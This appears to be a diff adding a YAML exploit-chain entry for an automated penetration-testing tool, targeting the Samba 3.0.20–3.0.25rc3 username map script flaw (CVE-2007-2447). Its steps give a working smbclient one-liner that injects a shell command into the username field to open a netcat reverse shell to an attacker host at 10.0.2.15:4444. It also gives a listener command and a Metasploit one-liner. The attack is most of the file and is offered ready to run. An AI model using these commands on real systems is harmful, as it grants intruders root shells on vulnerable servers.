@@ -1,0 +1,34 @@
+chain_id: samba_usermap_script_cve_2007_2447
+title: "Samba 3.0.20 - 3.0.25rc3 — CVE-2007-2447 username map script RCE"
+severity: CRITICAL
+tags: [smb, samba, cve-2007-2447, rce]
+
+trigger:
+  any_of:
+    - { product_pattern: "(?i)samba.*3\\.0\\.(2[0-5])" }
+    - { banner_pattern: "(?i)samba 3\\.0\\.(2[0-5])" }
+
+description: |
+  When `smb.conf` defines `username map script`, Samba 3.0.20-3.0.25rc3
+  passes the supplied username straight to a shell. Drop a payload in
+  the username field of an SMB session-setup request and Samba runs it
+  as root.
+
+steps:
+  - id: 1
+    title: "Single-line exploitation with smbclient"
+    command: |
+      smbclient //$VICTIMA/whatever -U "/=`nohup nc -e /bin/bash 10.0.2.15 4444`"
+
+  - id: 2
+    title: "Listener on Kali"
+    command: nc -lvnp 4444
+
+  - id: 3
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/multi/samba/usermap_script; \
+        set RHOSTS $VICTIMA; run'
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2007-2447
